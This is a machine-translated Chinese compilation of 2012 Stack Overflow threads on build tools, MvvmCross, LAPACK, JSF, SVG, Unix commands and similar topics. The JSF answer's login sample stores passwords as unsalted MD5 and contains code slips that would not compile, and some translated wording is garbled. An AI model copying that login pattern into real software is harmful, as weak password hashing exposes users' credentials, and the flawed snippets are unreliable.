$ brew install --use-llvm libxml2
$ brew install --use-llvm libxslt 
```

[从链接](https://github.com/kennethreitz/osx-gcc-installer)安装 gcc ，因为我仍然面临建议的选项 1 和 2 的问题

那么，无论是这个

```
$ export ARCHFLAGS="-arch i386 -arch x86_64"
$ /usr/bin/python2.6 setup.py build
$ sudo /usr/bin/python2.6 setup.py install 
```

或者这个，会工作

```
$ sudo env ARCHFLAGS="-arch i386 -arch x86_64" easy_install-2.6 lxml 
```

同样适用于 pycrypto

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:08:40.683

这表明您构建它的方式不正确：`/Developer/usr/bin/../lib/gcc/powerpc-apple-darwin10`当然，除非您使用的是旧的 powerpc 机器。

检查您正在运行的 OSX 版本，以及您用于构建 lxml 的命令。您可能需要`export ARCHFLAGS="-arch i386 -arch x86_64"`在构建之前在 shell 中进行设置，以避免使用`ppc`. 不知道为什么你会得到一个旧的拱门。

另外，请确保您安装了最新的 Xcode。而且，如果您逐字逐句地跟踪您发布的链接，请确保您使用的是这些软件包的最新版本，而不是文字版本，因为该链接已有 3 年历史。

如果一切都失败了，请安装[自制软件](https://brew.sh/)并通过该软件包管理器安装它。

**更新：** XCode 4.2+ 更新后缺少 GCC 4.2 的选项

选一个

1.  使用这个简单的指南安装 gcc 4.2：http:
    [//caiustheory.com/install-gcc-421-apple-build-56663-with-xcode-42](http://caiustheory.com/install-gcc-421-apple-build-56663-with-xcode-42)

2.  使用自制软件安装它： 

    `brew tap homebrew/dupes`
    `brew install homebrew/dupes/apple-gcc42`

3.  完全忽略 gcc 并将 llvm 与 brew 一起使用

    `brew install --use-llvm libxml2`

# c# - 将对象传递给 MVVMCross 中“导航到”视图模型的最佳方法是什么？

> ID：10658913
> 
> 赞同：12
> 
> 时间：2012-05-18T19:55:15.533
> 
> 标签：c#, windows-phone-7, xamarin.ios, xamarin.android, mvvmcross

我有一个 ViewModel，它包含一个 Team，它有一个 Players 属性，它是 Player 对象的列表。在 TeamView 中，Team 是深度加载的，因此玩家数据已经在内存中。

将给定的选定 Player 类实例传递给 PlayerView 的最佳方法是什么？

问题是 MVVMCross ViewModel 构造函数只能包含当前版本的字符串属性。

我有以下想法：

1.  传递所选 Player 的 Id 并将 Team.Players 属性作为 ViewModel 分配给 PlayerView。如果所选玩家只是 PlayerView 中的焦点玩家，并且 PlayerView 确实是一个“玩家”视图，用户也可以在其他团队玩家之间滑动，这可能是一个合理的解决方案。

2.  有一个类似于 ViewBag 的 ASP.Net MVC 服务，它只能在导航操作之间携带数据，在字典之类的存储中，传递给 PlayerView 的参数是“viewbag:PlayerId123”，它是指向类实例的特殊键。

3.  将所选对象序列化为字符串，并将其作为序列化对象传递给构造函数。这是可能的，但我不喜欢这个解决方案。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-18T20:39:16.477

在一般导航中，MvvmCross 只允许在 ViewModel 之间传递字符串。

原因是导航需要通过 Xaml Uris 或 Android Intents 等机制在平台级别完成。

对于您建议的情况，我通常使用的一般模式是：

*   TeamViewModel 使用注入的 ITeamService 从网络获取团队数据
*   TeamViewModel 还使用注入的单例 ITeamCache 来缓存团队
*   导航是通过如下调用发生的：

`this.RequestNavigate<PlayerViewModel>(new { teamId, playerId })`

*   PlayerViewModel 然后在其构造函数中接收 TeamId 和 PlayerId，并使用 ITeamCache 收集正确的玩家

此代码可能如下所示：

```
 public class TeamViewModel 
     : MvxViewModel
     , IMvxServiceConsumer<ITeamCache>
 {
     public TeamViewModel(string teamId, string playerId)
     {
         var teamCache = this.GetService<ITeamCache>();
         Player = teamCache.GetPlayer(teamId, playerId);
         if (Player == null)
         {
             // todo - handle this error somehow!
         }
     }

     public Player Player { get; set; }
 } 
```

请注意，上面的代码测试 Player 是否为`null`. 这是因为您的假设存在问题“在 TeamView 中，团队是深度加载的，因此玩家数据已经在内存中。”

问题在于，在 Android 和 WP7 等平台上，操作系统可以自由地将您的应用程序从内存中删除，然后再重新启动它。这在 WP7 上被称为[Tombstoning](http://msdn.microsoft.com/en-us/magazine/hh148153.aspx) ，但在 Android 上似乎被称为[Killed 。](http://docs.xamarin.com/android/tutorials/Activity_Lifecycle)

在这些情况下，操作系统可能会在用户返回时重新启动您的应用程序。此重新启动将直接转到用户上次所在的活动，并且它会记住返回堆栈 - 然后由您的应用程序将任何需要的对象正确地重新水化回内存。

这里有一些非常小的图片来解释这个......

![Xamarin 文档中的 Android 生命周期](../Images/bac61853c805bc881b2fcea7399e1cc4.png) ![在此处输入图像描述](../Images/9160a46ee935947d1f8b4f9f045c1c49.png)

有关更多详细信息，请参阅[Xamarin](http://docs.xamarin.com/android/tutorials/Activity_Lifecycle)和[MSDN](http://msdn.microsoft.com/en-us/magazine/hh148153.aspx)

* * *

对于您的团队/球员案例，您可以通过以下方式应对补液：

*   将 ITeamCache 实现为文件支持的对象 - 例如，它可以使用 JSON 文件或 SQLite 数据库作为内存数据的持久存储
*   在代码中实现一些逻辑，在需要时从网络重新获取数据
*   在这些情况下实施一些紧急导航回家策略——因为这些情况在现代资源丰富的手机上的许多应用程序中并不经常发生。
*   只是崩溃 - 虽然这是不可取的......

毫不奇怪，许多应用程序不能很好地处理墓碑......

* * *

注意 - 对于小对象，您的选项 3（序列化）可以很好地工作 - 但是，这不会帮助您解决应用程序补液并且用户随后从 PlayerViewModel 导航回 TeamViewModel 的情况。

* * *

有关 MvvmCross 中 Android 生命周期的一些最新变化的更多信息，请参阅[http://slodge.blogspot.co.uk/2012/05/android-application-initialization-and.html](http://slodge.blogspot.co.uk/2012/05/android-application-initialization-and.html)

# compilation - 链接lapack问题

> ID：10658916
> 
> 赞同：4
> 
> 时间：2012-05-18T19:55:36.663
> 
> 标签：compilation, makefile, fortran, lapack, gfortran

我正在尝试编译一个使用 lapack 的程序。

首先，我通过在此链接上使用“sudo apt-get install”安装所有软件包来安装 lapack： [https ://launchpad.net/ubuntu/precise/+source/lapack](https://launchpad.net/ubuntu/precise/+source/lapack)

我正在尝试编译此页面上的代码：http: [//www.nag.com/lapack-ex/examples/source/dgbsv-ex.f](http://www.nag.com/lapack-ex/examples/source/dgbsv-ex.f)

我从以下网站得到这个程序：http: [//www.nag.com/lapack-ex/lapack-ex.html](http://www.nag.com/lapack-ex/lapack-ex.html)

我试图通过键入来编译程序

```
$gfortran dbgsv-ex.f -llapack -lblas 
```

进入终端

我收到一堆错误消息，所有的形式

```
/usr/lib/gcc/i686-linux-gnu/4.6/../../../../lib/liblapack.so: undefined reference to         
`ATL_strsv' 
```

即错误消息以 . 结尾`ATL_xxxx`。另请注意，当我查看我的文件时，`/usr/lib/` 我看到一个名为`liblapack.so`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-04T06:59:15.677

正如其他评论已经表明的那样，您的系统具有 LAPACK 的 ATLAS 实现。库链接的正确顺序（对于 ATLAS 的非线程版本）将是：

```
-llapack -lf77blas -lcblas -latlas 
```

另请注意，您的 Fortran 代码似乎还包含来自 NAG 库 (x04cef) 的例程，因此您还必须链接 NAG 库。

# c# - C# 双精度型数学运算

> ID：10658918
> 
> 赞同：0
> 
> 时间：2012-05-18T19:55:39.733
> 
> 标签：c#, mysql, double

> **可能重复：**
> [在 C#](https://stackoverflow.com/questions/1398753/problem-in-comparing-double-values-in-c-sharp)
> [Double 变量中比较双精度值时出现错误值的问题](https://stackoverflow.com/questions/2025958/double-variable-keeping-wrong-value)

我将一些值存储在 MySQL 数据库的表中，列类型为`double(8,2)`. 我正在获取该数据，然后调用 LINQ 的`Sum()`扩展方法。该操作返回例如`384.18`。然后我得到第二个值（以相同的方式），我得到例如`384.17`.

当我做一些数学运算时，结果是：

```
384.18 - 384.17 = 0.0099999999999909051 
```

为什么不`0.01`呢？我知道我可以使用该`Math.Round()`方法，但我想知道为什么我会得到这个结果。

## 编辑

[比较 C# 中的双精度值](https://stackoverflow.com/questions/1398753/problem-in-comparing-double-values-in-c-sharp)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:58:49.203

Double 没有您需要的精度。在 C# 中使用小数，在 SQL 中使用更精确的数字类型 - SQL-Server 将是 NUMERIC(x,y)。不确定MySql equiv。

# python - scala 相当于 python __getattr__ / __setattr__

> ID：10658920
> 
> 赞同：4
> 
> 时间：2012-05-18T19:55:53.113
> 
> 标签：python, scala, dynamic, properties, getter-setter

是否有 scala 等效于 python `__getattr__ / __setattr__`（和其他`__*__`方法？）。一些内置的东西或者一些特征？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-18T21:19:27.050

因为你必须等到有更多洞察力的人描述新的 Scala 2.10 反射 API `__getattr__`。`__setattr__`（当然：它永远不会直接翻译。这完全取决于您的用例。如果您只想要一个动态类，将来会有一个`Dynamic`特征；如果您只想要一点点，那么围绕模式匹配进行设计可能是一个明显的选择。）

至于[Python中的许多](http://docs.python.org/reference/datamodel.html#special-method-names)[其他`__*__`](http://docs.python.org/reference/datamodel.html#special-method-names)方法：

### 全球事物

*   `__call__`→ `apply()`// 行为几乎相同
*   `__metaclass__`// 用例依赖：
    *   目前`class`继承或`trait`混合可能有用
    *   在许多情况下，元类所做的只是避免调用的实例构造`super()`；在 Scala`super()`中总是在构造函数中调用。
*   `__repr__`, `__str__`→`toString()`
*   `__eq__`→`equals()`
*   `__init__`// 在类体中隐式调用
*   `__new__`// 不直接存在；取决于用例*[早期初始化](https://stackoverflow.com/questions/4712468/in-scala-what-is-an-early-initialize)*
*   `__del__`//*缺失*
*   `__nonzero__`// 不是真的，除了`implicit def toBool[MyType](a: MyType): Boolean = ...`

### 容器类型

*   `__len__`⇝ `length`，`size`或者容器中的任何约定
*   `__getitem__`→ `apply(i: IndexType)`// 容器是 Scala 中的函数
*   `__setitem__`→`update(i: IndexType, v: ValueType)`
*   `__delitem__`// 不需要特殊处理；集装箱公约
*   `__iter__`→ `foreach(block: ValueType => Unit)`// 有返回值: `map`,`flatMap`

值得注意的是，它在 Scala`apply`中`update`很*特别*，就像它们的 Python 对应物一样。它们允许以下语法：

```
val x = collection(elem) // val x = collection.apply(elem)
collection(elem) = y // collection.update(elem, y) 
```

类似地，正如 Python`__iter__`允许使用类似的语法`(el for el in container)` `foreach`，并且`map`可以说`for (el <- container) yield el`.

### 运营商

*通常不需要特殊处理，因为我们可以直接定义它们*：

*   `__add__`, `__sub__`, ... // 只需定义`def + (arg: T)`或`def - (arg: T)`

这也包括比较运算符

*   `__lt__`, `__ge__`→ `def <(other: T)`,`def <=(other: T)`

*然而，就像在 Python 中一样，在编译器中也有一些用于高级事物的特殊情况：*

*   `__radd__`, `__rsub__`, … // 右结合运算符；大约 `def +: (arg: T)`或`def -: (arg: T)`（附加一个`:`）
*   `__iadd__`, `__isub__`, ... // 修改操作符: `def += (arg: T)`, ...</li>

### 上下文管理器

*   `__enter__`, `__exit__`// 在大多数情况下，函数参数实现相同的目的

另请参阅：[Scala 的“魔法”函数列表](https://stackoverflow.com/questions/1483212/list-of-scalas-magic-functions)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T23:17:28.970

我不确定这里有什么意义。Scala 的统一访问原则意味着“字段”和方法共享相同的接口——因为事实上，Scala 中的“字段”是 getter 和 setter。

换句话说，您可以像这样替换它们：

```
var x: Int = 0

private[this] var _x = 0
def x = _x
def x_=(n: Int) { _x = n } 
```

getter 和 setter 方法将控制对您声明的私有字段的访问。

现在，如果您想要的只是一种提供非静态字段的方法，那么您必须查看 Dynamic trait。它在 2.9.2 之前是实验性的，但它将在 2.10 上可用，尽管在一个标志后面警告人们这个特性是危险的（因为它引入了动态类型，但如果你不认为动态类型是危险的，你应该美好的）。

# jenkins - Jenkins 测试趋势图未更新

> ID：10658921
> 
> 赞同：3
> 
> 时间：2012-05-18T19:55:54.493
> 
> 标签：jenkins, automated-tests

我工作的公司使用 Jenkins 作为他们的测试管理软件。非常有用，到目前为止非常满意。唯一的问题是自 Build #28 以来测试结果趋势图实际上并没有更新。（我们准备为这个特定的自动化套件构建 #54。）

有什么办法可以强制 TRTG 更新吗？

![在此处输入图像描述](../Images/69f0d91d0ad3a59176bff379acd437cc.png)

![在此处输入图像描述](../Images/0931a15bc324ede17b322e0065958083.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T20:10:09.267

您需要一个成功的构建来更新测试趋势。检查为什么自 28# 以来构建被标记为失败。

为此，您可以单击上次构建失败时的控制台输出。

# browser - 平滑缩放 svg 中的填充图案

> ID：10658922
> 
> 赞同：2
> 
> 时间：2012-05-18T19:55:55.073
> 
> 标签：browser, svg

我正在使用 svg 制作可缩放和可平移的地图（以便于交互）。我有一个网格，其他对象（矩形）可以对齐。

网格是一个填充有图案的矩形。该图案仅包含一个矩形。缩放和平移是通过转换完成的。相同的转换应用于模式和我想要与网格对齐的每个元素。平移（平移）正常工作，但缩放（缩放）不能正常工作。

该模式似乎仅以特定间隔缩放，而其他元素在每个间隔缩放。就好像该模式的转换精度要低得多。

## 演示：http: [//jsfiddle.net/Gxz2P/](http://jsfiddle.net/Gxz2P/)

下面的代码有效地演示了 firefox、chrome 和 safari 中的问题：

```
<!DOCTYPE html>
<html>
<head>
    <script>
function setMatrix(a,b,c,d,e,f){
    var matrix = [a,b,c,d,e,f];
    matrix = matrix.join();
    matrix = 'matrix(' + matrix + ')';
    document.getElementById('pat').setAttribute('patternTransform', matrix);
    document.getElementById('boxRect').setAttribute('transform', matrix);
}

function startGrow(sleepy){
    if(! sleepy){
        sleepy = 100;
    }
    var grow = function(lastZoom){
        var zoom = lastZoom + 0.01;
        setMatrix(zoom, 0, 0, zoom, 0, 0);
        if(zoom < 2){
            setTimeout(function(){
                grow(zoom);
            }, sleepy);
        }
    }

    grow(1);
}
    </script>
</head>
<body>
    <svg width="100%" height="1500">
        <defs>
            <pattern id="pat" x="0" y="0" width="32" height="32" patternUnits="userSpaceOnUse">
                <rect x="2" y="2" width="28" height="28" stroke="red" fill="lightblue" />
            </pattern>
        </defs>
        <rect x="0" y="0" width="1000" height="1000" fill="url(#pat)" stroke="black" id="gridRect" />
        <rect x="320" y="320" width="32" height="32" fill="rgba(0,0,0,0)" stroke="red" id="boxRect" />
        <rect x="352" y="352" width="32" height="32" fill="rgba(0,0,0,0)" stroke="black" id="staticBox" />
    </svg>
    <script>
startGrow(100);
    </script>
</html> 
```

在浏览器中加载页面将显示网格如何与红色边框框同时缩放，即使它们同时获得相同的矩阵。

有没有办法获得平滑的缩放填充图案，或者我应该刮掉这个并为网格尝试不同的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:37:22.873

它似乎与像素边界上图案元素缩放的大小有关。如果您创建一个更大的模式（那么重点是什么，对吗？）您不会遇到同样的问题：

## 演示：http: [//jsfiddle.net/Gxz2P/3/](http://jsfiddle.net/Gxz2P/3/)

# linux - 如何从命令行找到两个文件的 Set - Subset？

> ID：10658924
> 
> 赞同：6
> 
> 时间：2012-05-18T19:56:08.813
> 
> 标签：linux, bash, unix, set, zsh

我有两个带有排序行的文件。一个文件 (B) 是另一个文件 (A) 的子集。我想找到 A 中不在 B 中的所有行。理想情况下，我想创建一个包含这些行的文件 (C)。这在 Unix 中可能吗？我正在寻找一个单行命令来执行此操作，而不是编写脚本。我查看了`join`and`diff`命令，但找不到执行此操作的命令选项。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-18T20:05:16.340

这将抑制常见的行：

```
comm -3 a b 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T20:03:50.027

这个怎么样：

```
grep -v -f B A > C 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-18T20:09:34.263

你也可以用 diff 来做到这一点。Diff（与@johlo 的 grep 答案不同）关心顺序，适用于未排序的文件（与@johnshen64 的 comm 答案不同）：

```
$ cat a
a
b
c
d
e
$ cat b
a
b
f
d
e
$ diff -dbU0 a b
--- a   2012-05-18 16:02:30.603386016 -0400
+++ b   2012-05-18 16:02:45.547817122 -0400
@@ -3 +3 @@
-c
+f 
```

因此，您可以使用管道仅获取省略的行——考虑顺序：

```
$ diff -dbU0 a b | tail -n +4 | grep ^- | cut -c2-
c 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T22:13:30.943

该`join`命令将执行您的要求：

```
join -v 1 fileA fileB > fileC 
```

示范：

```
$ cat fileA
a
c
d
g
h
t
u
v
z
$ cat fileB
a
d
g
t
u
z
$ join -v 1 fileA fileB
c
h
v 
```

这假设您在问题中所述已排序文件。对于未排序的文件：

```
join -v 1 <(sort fileA) <(sort fileB) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-18T20:21:05.493

**awk 解决方案**

输入文件

**一种**

```
aaa
bbb
ccc 
```

**b**

```
ccc
ddd
eel 
```

**代码**

```
awk ' NR==FNR { A[$0]=1; next; }
{ if ($0 in A) { A[$0]=0; } }
END { for (k in A) { if (A[k]==1) { print k; } } } ' a b > c 
```

**c**（输出文件）

```
bbb
aaa 
```

# jquery - RegularExpressionValidator 和 JQuery 对话框在回发时崩溃

> ID：10658926
> 
> 赞同：1
> 
> 时间：2012-05-18T19:56:16.557
> 
> 标签：jquery, asp.net, validation

**一开始，没有验证器，一切正常**

Web 用户控件有一个按钮，可以在 Jquery 弹出对话框中打开面板。该面板有一些文本框。

**然后是RegularExpressionValidator，我很生气**

我将 RegEx 验证器添加到我的多行文本框中，以确保最大长度。它们确实有效，但是当我关闭 JQuery 对话框并尝试再次打开它时，会出现错误：“无法读取 null 的属性值”。这是方法：

当对话框关闭时：

```
$("#" + PanelClientId)        
        .dialog({
            autoOpen: false,            
            hide: tipoHide,
            modal: true,
            title: titulo,
            width: ancho,
            height: alto,
            close: function(ev, ui) { $(this).remove();}
            }); 
```

Validator 控件为空，但客户端验证例程触发并失败

```
function ValidatorGetValue(id) {
    var control;
    control = document.getElementById(id);
    if (typeof(control.value) == "string") 
```

正如我所说，因为控制是空的。

**请帮我**

我希望我用我蹩脚的英语表达清楚。请帮我解决这个问题。我正在考虑在验证之前添加客户端事件，然后将 ControlToValidate 分配给我的验证器，但直到现在我还无法添加任何在验证之前执行的事件。

**所以家人，**非常感谢您花时间阅读本文并提供宝贵的帮助。

这是我的验证器代码：

```
<asp:TextBox runat="server" ID="txtJustificacionSpeaker" TextMode="MultiLine" Wrap="true"
    Rows="4" Width="90%" CssClass="TextoMultilineaScrollAuto"></asp:TextBox>
<asp:RegularExpressionValidator id="revJustificacionSpeaker" runat="server"
        ErrorMessage="*" ToolTip="La justificación no puede exceder 2000 caracteres" ValidationExpression="^([\S\s]{0,2000})$" ControlToValidate="txtJustificacionSpeaker" /> 
```

# jquery - 容器内的 jQuery Mobile 滑动事件

> ID：10658935
> 
> 赞同：1
> 
> 时间：2012-05-18T19:56:55.983
> 
> 标签：jquery, jquery-mobile

我无法让 jQuery 移动滑动事件在可折叠集合中工作。如果我在可折叠套装之外使用它，我就能让它工作。测试有效：

```
<div id="listitem"> swipe me </div> 
```

我想做什么：

```
 <div data-role="collapsible-set" data-mini="true" data-theme=
              "c" data-content-theme="d">
                <div data-role="collapsible" data-theme="a">
                  <div>
                    <h4>
                      Conduct Training
                    </h4>
                  </div>
                  <div id="listitem">
                    <p>
                      <a href="/PlaybookRequest/FileRequest/2014658414/"
                      rel="external" data-ajax="false">link</a>
                    </p>
                  </div>
</div> 
```

两者都在我的布局页面上使用这个 javascript：

```
 <script type='text/javascript'>
    $(window).load(function () {
        $("#listitem").swiperight(function () {
            console.log("worked");
        });
    });  
</script> 
```

对于那些好奇的人：我希望能够让用户单击链接以查看某些内容并滑动链接以直接下载。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T10:16:42.987

使用 jQueryMobile 时，您不应使用 onload 或 domready 事件，而应使用 pageinit 事件：

```
$(document).live('pageinit', function () {
    $("#listitem").swiperight(function () {
        console.log("worked");
    });
}); 
```

那样有用吗？

编辑：将绑定更改为实时。

# java - 在 Java 中高效地存储数组列表

> ID：10658937
> 
> 赞同：1
> 
> 时间：2012-05-18T19:56:59.877
> 
> 标签：java, arrays, list, arraylist

长话短说，我需要一个可以是不同类型（int、double、String、byte 等）的数组列表。现在问题是我已经让它与一个未指定的 ArrayList 对象一起工作，但是每次我从 ArrayList 检索一个数组时，我都会将它转换为我想要的数组类型，例如`((double[]) arraylist.get(j))[i]`然后做我必须做的事情。

但我担心的是：这是一个将迭代数百次的程序，我觉得这非常低效和缓慢。宁愿只有一个引用列表，而不是需要不断的转换。因此，任何关于替代方案的想法都将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T20:02:39.630

没有完成实际的转换，只是在运行时进行类型检查。如果您只需要每秒执行几百次，这应该不是什么大问题，尽管存储不相关的数据听起来好像您是从错误的角度解决问题（当然我可能是错的，但我无法想到需要或首选这样做的情况）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T20:10:24.640

正如所有其他人所说 - 没有转换 - 它只是一个演员。

但是如果你不想写这个演员表，你可以把它包装`listarray`在类中并提供一个方法：

```
public <T> T get(int indexOfArray, int indexInArray) {
    return (T) ((T[]) arraylist.get(indexOfArray))[indexInArray];
} 
```

这样您就可以在代码中使用：

```
MyClassWithArrayList l = new MyClassWithArrayList(...);
...
double d = l.get(1, 2); 
```

但当然你必须完全确定`1`索引处的数组是`double`类型的（会有强制转换异常）

或者如果你知道索引处总是会有一个双精度数组，`1`你可以写

```
public interface AppConstants {
    public static final int DOUBLE_TABLE_INDEX = 1;
    ... 
```

并使用：

```
double d = l.get(AppConstants.DOUBLE_TABLE_INDEX, 2); 
```

# c# - 设置进程执行的键盘修饰符

> ID：10658942
> 
> 赞同：0
> 
> 时间：2012-05-18T19:57:41.747
> 
> 标签：c#, windows

我有一个 Windows 应用程序，我想从按下 shift 键开始。但是它是在 citrix 上启动的，这意味着我们不能按住 shift 键，因为它不能以合理的方式进行转换。我在想也许我可以编写一个皮套应用程序，在模拟 shift 键的同时分叉和执行。但是，我一直无法找到在启动期间设置修饰符的方法。有任何想法吗？

# jsf - 从请求范围的 bean 访问会话范围的 bean

> ID：10658944
> 
> 赞同：4
> 
> 时间：2012-05-18T19:57:44.147
> 
> 标签：jsf, jsf-2, session-scope

我正在尝试使用在 IceFaces 页面上找到的模式。（我没有使用 IceFaces，使用 PrimeFaces）

在这种情况下，我有两个豆子：

*用户*控制器 和用户*模型*

在我的*UserModel*上，我有一个*UserVO*实例（由另一个程序员创建）。在我的*UserController*我有这个：

```
@ManagedBean
@RequestScoped
public class UserController implements Serializable
{

    private static final long serialVersionUID = 1L;
    private UserBO bo;
    private UserModel model;

    public UserController()
    {
        bo = new UserBO();
        model = new UserModel();
    }

    public void Login() throws IOException
    {
        model.setUserVo(bo.executeLogin(model.getUserVo()));
        ExternalContext externalContent = FacesContext.getCurrentInstance().getExternalContext();
        if (!model.getUserVo().isError())
        {
            model.setLoggedIn(true);
            externalContent.getSessionMap().put("userSession", model);
            externalContent.redirect(externalContent.getRequestContextPath() + "/views/request/search.html");
        } else
        {
            model.setLoggedIn(false);
            FacesMessage facesMessage = new FacesMessage(FacesMessage.SEVERITY_ERROR, model.getUserVo().getMessage(), model.getUserVo().getLogin());
            FacesContext.getCurrentInstance().addMessage(null, facesMessage);
        }
    }

    public UserBO getBo()
    {
        return bo;
    }

    public void setBo(UserBO bo)
    {
        this.bo = bo;
    }

    public UserModel getModel()
    {
        return model;
    }

    public void setModel(UserModel model)
    {
        this.model = model;
    }
} 
```

如您所见，我创建了一个*UserModel*的新实例，并使用从返回的内容进行设置，`bo.executeLogin()`并且它正在工作，我的对象被返回。

为了确保用户已登录，我的*UserModel*上有一个属性：

```
@ManagedBean
@SessionScoped
public class UserModel
{

    private UserVO userVo;
    private Boolean loggedIn = false;

    public UserModel()
    {
        userVo = new UserVO();
    }

    public UserVO getUserVo()
    {
        return userVo;
    }

    public void setUserVo(UserVO userVo)
    {
        this.userVo = userVo;
    }

    public Boolean getLoggedIn()
    {
        return loggedIn;
    }

    public void setLoggedIn(Boolean loggedIn)
    {
        this.loggedIn = loggedIn;
    } 
```

我有一个*template.xhtml*：

```
<ui:fragment rendered="#{userModel.loggedIn}">
            <ui:include src="../includes/top.xhtml"/>
</ui:fragment> 
```

问题是它不起作用，没有获得`loggedIn`财产价值。

我的猜测是，以这种方式访问​​我有点创建*UserModel*的新实例，如果是这样，这是一个问题，因为我的*UserController* 不是会话范围，只有*UserModel*

**编辑**

而不是使用这个`loggedIn`属性，我知道我可以简单地检查是否设置了*UserModel* `userVo`属性，但问题是关于会话范围的 bean，我无法从设置它的*UserController*访问它，因为它不是范围会话，而且我的 每个页面都将使用*template.xhtml 。*

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-21T20:03:40.493

^(*（这最初发布在[https://stackoverflow.com/questions/10691324/working-with-3-java-beans-controller-backing-model](https://stackoverflow.com/questions/10691324/working-with-3-java-beans-controller-backing-model)上，但是 OP 删除了这个问题，我不想扔掉回答，我认为这个问题的转贴也是合适的）*)

您可能过于关注这个主要包含[废话的](https://stackoverflow.com/questions/7223055/distinction-between-different-types-of-managed-beans/7223910#7223910)[ICEfaces 博客](http://java.dzone.com/articles/making-distinctions-between)。

您应该有一个充当控制器的 JSF 托管 bean，您已经拥有它：`UserController`. 你应该有一个代表模型的简单实体 bean，你已经有了它：`UserVO`. 你应该有一个代表服务的企业 bean，你已经有了它：`UserBO`. 最后两个不需要是 JSF 管理的 bean。

根据您使用 Glassfish 的问题历史，您可以使用 JPA 和 EJB。所以模型类应该是 JPA `@Entity`，服务类应该是`@Stateless`EJB。

然而，“登录用户”的用例是特殊的。您不希望将实体作为会话范围的托管 bean，否则它将由 JSF 隐式创建。你最好自己把它直接放在会话范围内，这样你就可以检查`#{not empty user}`用户是否登录。

总而言之，它应该看起来像这样：

```
@Entity
public class User {

    private String username;
    private String password;

    // ...
} 
```

```
@Stateless
public class UserService {

    @PersistenceContext
    private EntityManager em;

    public User find(String username, String password) {
        return em.createQuery("SELECT u FROM User u WHERE username = :username AND password = MD5(:password)", User.class)
           .setParameter("username", username)
           .setParameter("password", password)
           .getSingleResult();
    }

} 
```

```
@ManagedBean
@ViewScoped
public class UserController {

    private String username;
    private String password;

    @EJB
    private UserService service;

    public String login() {
        FacesContext context = FacesContext.getCurrentInstance();

        try {
            User user = userService.find(username, password);
            context.getExternalContext().getSessionMap().put("user", user);
            return "/views/commons/home.html?faces-redirect=true";
        }
        catch (NoResultException) {
            context.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, "Unknown login, please try again", null));
            return null;
        }
    }

    public String logout() {
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
        return "/views/commons/login.html?faces-redirect=true";
    }

    // ...
} 
```

和

```
<h:form>
    <h:inputText value="#{userController.username}" required="true" />
    <h:inputSecret value="#{userController.password}" required="true" />
    <h:commandButton value="login" action="#{userController.login}"/>
    <h:messages />
</h:form> 
```

或者，您可以创建`UserController`一个包含`User`实体的会话范围 bean，您只需要添加一个额外的方法来检查用户是否已登录，以便您可以在 EL 中使用它`#{userController.loggedIn}`。

```
@ManagedBean
@SessionScoped
public class UserController {

    private User user = new User();

    @EJB
    private UserService service;

    public String login() {
        FacesContext context = FacesContext.getCurrentInstance();

        try {
            user = userService.find(user.getUsername(), user.getPassword());
            return "/views/commons/home.html?faces-redirect=true";
        }
        catch (NoResultException) {
            context.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, "Unknown login, please try again", null));
            return null;
        }
    }

    public String logout() {
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
        return "/views/commons/login.html?faces-redirect=true";
    }

    public boolean isLoggedIn() {
        return user.getId() != null;
    }

    // ...
} 
```

和

```
<h:form>
    <h:inputText value="#{userController.user.username}" required="true" />
    <h:inputSecret value="#{userController.user.password}" required="true" />
    <h:commandButton value="login" action="#{userController.login}"/>
    <h:messages />
</h:form> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T20:08:33.983

与其在您的 中创建新`UserModel`实例`UserController`，不如将其注入`@ManagedProperty`.

在`UserController`：

```
@ManagedProperty(value="#{userModel}")
private UserModel model;

// add getter and setter for userModel (important!) 
```

然后你不必在构造函数中实例化它，并且总是会`UserModel`在你的控制器中获得会话范围的实例。

**更新：**

我认为您使用严格的 MVC 方法使登录过程复杂化。在 JSF 中，模型、视图和控制器之间的界限有些模糊或重叠。

我建议阅读[这个有趣的问题和答案](https://stackoverflow.com/q/5104094/620338)，尤其是[这个答案](https://stackoverflow.com/a/10114158/620338)以获取有关该主题的更多信息。

至于你的具体问题。我不太确定原因是什么，但您绝对应该避免的是自己实例化托管 bean 并摆弄注入和自初始化的 bean 实例。

另外，我建议将您的 bean 合并为一个 bean。那么你就没有循环依赖和空引用的问题了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-27T22:07:37.907

您可以使用依赖注入从具有会话范围的 bean 中获取值。

```
@Inject UserModel user; 
```

然后你可以在你的 UserControl bean 中使用这个 Object。顺便说一句，当您处理 RequestScope bean 时，您不需要实现可序列化。

# java - 从 Servlet 获取复选框值

> ID：10658945
> 
> 赞同：6
> 
> 时间：2012-05-18T19:57:49.250
> 
> 标签：java, mysql, html, servlets

我有一个带有 MySQL 数据库的 servlet。它看起来像这样：![在此处输入图像描述](../Images/ed6c001a1732979ecd0a9ba2d9ee4807.png)

这是它的一段代码：

```
out.println("<table id = \"main_section\" cellspacing=\"1\" bgcolor=\"red\" > ");
out.println ("<tr> ");
out.println("<td >NUMBER</td>");
out.println("<td >PAYMENT</td>");
out.println("<td >RECEIVER</td>");
out.println("<td >VALUE </td>");
out.println("<td >CHECKBOX</td>");
